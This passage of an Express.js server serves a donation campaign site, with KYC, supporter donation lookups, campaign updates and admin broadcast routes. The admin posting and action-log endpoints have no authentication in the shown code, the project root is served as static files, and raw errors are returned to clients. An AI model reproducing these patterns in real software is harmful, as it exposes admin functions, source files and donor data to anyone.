    sessions.set(sessionId, { verified: true, supporter_hash });

    res.json({
      success: true,
      message: 'KYC submitted successfully',
      redirect: '/dashboard?verified=success'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Donations API
app.get('/api/donations/:supporter_hash', (req, res) => {
  const { supporter_hash } = req.params;
  const userDonations = db.donations.filter(d => d.supporter_hash === supporter_hash);
  const total = userDonations.reduce((sum, d) => sum + (d.amount || 0), 0);
  res.json({
    success: true,
    donations: userDonations.map(d => ({
      receipt_id: d.receipt_id,
      amount: d.amount,
      description: d.description,
      status: d.status,
      date: d.created_at
    })),
    total,
    count: userDonations.length
  });
});

// Campaign Progress API
app.get('/api/campaign/progress', (req, res) => {
  const progress = db.campaign_progress.map(r => ({
    category: r.category,
    goal: r.goal_amount,
    current: r.current_amount,
    description: r.description,
    deadline: r.deadline,
    percent: r.goal_amount > 0 ? Number(((r.current_amount / r.goal_amount) * 100).toFixed(1)) : 0
  }));
  res.json({ success: true, progress });
});

// Campaign Updates API
app.get('/api/campaign/updates', (req, res) => {
  const updates = db.campaign_updates.map(r => ({
    id: r.id,
    title: r.title,
    body: r.body,
    tag: r.tag,
    featured: Boolean(r.is_featured),
    date: r.created_at
  }));
  res.json({ success: true, updates });
});

// Fund Allocation API
app.get('/api/campaign/allocation', (req, res) => {
  res.json({ success: true, allocation: db.fund_allocation });
});

// Supporter Profile API
app.get('/api/supporter/profile/:supporter_hash', (req, res) => {
  const { supporter_hash } = req.params;
  const profile = db.supporter_profiles.find(p => p.supporter_hash === supporter_hash);
  const userDonations = db.donations.filter(d => d.supporter_hash === supporter_hash);
  const totalDonated = userDonations.reduce((s, d) => s + (d.amount || 0), 0);

  if (!profile) {
    return res.status(404).json({ error: 'Supporter not found' });
  }

  let tier = 'Bronze';
  if (totalDonated >= 2000) tier = 'Platinum';
  else if (totalDonated >= 500) tier = 'Gold';
  else if (totalDonated >= 100) tier = 'Silver';

  res.json({
    success: true,
    tier,
    total_donated: totalDonated,
    donation_count: userDonations.length,
    referrals: profile.referral_count,
    events_attended: profile.events_attended,
    member_since: profile.created_at
  });
});

// Broadcasts API
app.get('/api/broadcasts/latest', (req, res) => {
  const activeBroadcasts = db.broadcasts
    .filter(b => b.is_active)
    .slice(0, 5)
    .map(b => ({ message: b.message, date: b.created_at }));
  res.json({ success: true, broadcasts: activeBroadcasts });
});

// Session API
app.get('/api/session', (req, res) => {
  res.json({ success: false, message: 'Not verified' });
});

// Admin Post Campaign Update
app.post('/api/admin/update', (req, res) => {
  try {
    const { title, body, tag = 'Update', featured = false } = req.body;
    if (!title || !body) {
      return res.status(400).json({ error: 'Title and body are required' });
    }

    const newUpdate = {
      id: db.campaign_updates.length + 1,
      title,
      body,
      tag,
      is_featured: Boolean(featured),
      created_at: new Date().toISOString()
    };
    db.campaign_updates.unshift(newUpdate);

    db.admin_actions.unshift({
      id: db.admin_actions.length + 1,
      action_type: 'campaign_update',
      details: `Published: "${title}"`,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, message: 'Campaign update published successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin Send Broadcast
app.post('/api/admin/broadcast', (req, res) => {
  try {
    const { message } = req.body;
    if (!message) {
      return res.status(400).json({ error: 'Message is required' });
    }

    db.broadcasts.unshift({
      id: db.broadcasts.length + 1,
      message,
      is_active: true,
      created_at: new Date().toISOString()
    });

    db.admin_actions.unshift({
      id: db.admin_actions.length + 1,
      action_type: 'broadcast',
      details: `Sent: "${message}"`,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, message: 'Broadcast sent successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin Actions Log
app.get('/admin-actions', (req, res) => {
  res.json({
    success: true,
    actions: db.admin_actions.slice(0, 50)
  });
});

// Serve static files from root directory
app.use(express.static(__dirname));

// Serve static files from /assets and /static explicitly
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/static', express.static(path.join(__dirname, 'static')));

// Catch-all 404 handler for unknown routes
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
